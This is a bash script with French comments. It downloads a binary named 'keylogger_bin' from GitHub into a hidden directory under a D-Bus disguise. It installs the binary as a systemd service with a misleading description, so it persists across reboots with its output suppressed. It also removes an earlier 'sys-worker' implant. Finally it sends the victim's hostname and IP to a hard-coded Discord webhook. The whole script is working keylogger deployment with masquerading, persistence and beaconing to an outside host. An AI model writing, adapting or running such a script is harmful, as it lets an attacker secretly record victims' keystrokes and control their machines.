#!/bin/bash

# ─── Configuration ───────────────────────────────────────────────────────────
WEBHOOK_URL="https://discord.com/api/webhooks/1488635228603023371/V5RAgOeKALap4uu2J3QeOBpGHyXXlr9X7OKGAWB1h5wYpRU5LtSQOPdqimbtkdRIizn_"
GITHUB_BIN_URL="https://raw.githubusercontent.com/Tomatorgb/KlinuxconfigL/main/keylogger_bin"
INSTALL_DIR="/usr/local/src/.dbus"
BINARY_NAME=".dbus-daemon"
SERVICE_NAME="dbus-sync-service"

# Nettoyage de l'ancienne version s'il y en a une
sudo systemctl stop sys-worker 2>/dev/null
sudo systemctl disable sys-worker 2>/dev/null
sudo pkill -9 -f ".sys_worker" 2>/dev/null
sudo rm -f /etc/systemd/system/sys-worker.service 2>/dev/null

# ─── Installation du binaire ─────────────────────────────────────────────────
mkdir -p "$INSTALL_DIR"
chmod 700 "$INSTALL_DIR"
curl -sL "$GITHUB_BIN_URL" -o "$INSTALL_DIR/$BINARY_NAME"
chmod +x "$INSTALL_DIR/$BINARY_NAME"

# Créer le fichier de cache (logs)
touch /var/log/.dbus-cache.tmp
chmod 600 /var/log/.dbus-cache.tmp

# ─── Persistance via systemd ──────────────────────────
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=D-Bus system synchronization service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/sleep 20
ExecStart=${INSTALL_DIR}/${BINARY_NAME}
Restart=always
RestartSec=300
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Activer et démarrer
systemctl daemon-reload
systemctl enable ${SERVICE_NAME}.service
systemctl start ${SERVICE_NAME}.service

# Notification Discord (discrète) via Python3
python3 - << PYEOF
import urllib.request, json, os

webhook = """$WEBHOOK_URL"""

msg = (
    "**[SYSTEM SYNC]** Configuration update successful.\n"
    "\`\`\`\n"
    "Host: " + os.popen('hostname').read().strip() + "\n"
    "IP:   " + os.popen('hostname -I').read().strip().split()[0] + "\n"
    "\`\`\`"
)

data = json.dumps({"content": msg}).encode("utf-8")
req = urllib.request.Request(webhook.strip(), data=data, headers={"Content-Type": "application/json"})
try:
    urllib.request.urlopen(req, timeout=10)
    print("[+] Sync confirmed.")
except:
    pass
PYEOF

echo "[+] Done."